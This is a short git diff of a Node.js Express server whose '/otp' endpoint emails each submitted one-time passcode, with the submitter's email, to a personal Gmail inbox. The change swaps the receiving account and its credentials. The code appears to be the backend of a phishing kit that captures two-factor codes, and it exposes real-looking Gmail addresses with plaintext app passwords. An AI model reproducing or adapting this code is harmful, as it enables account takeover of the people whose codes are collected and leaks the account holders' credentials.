@@ -96,16 +96,16 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "edehchinedu59@gmail.com",
-      pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
+      // user: "edehchinedu59@gmail.com",
+      // pass: "yknycyzsxdkxpepq",
+      user: "gracesufficient65@gmail.com",
+      pass: "gdvumrctjugtigmo",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "edehchinedu59@gmail.com",
+    to: "gracesufficient65@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
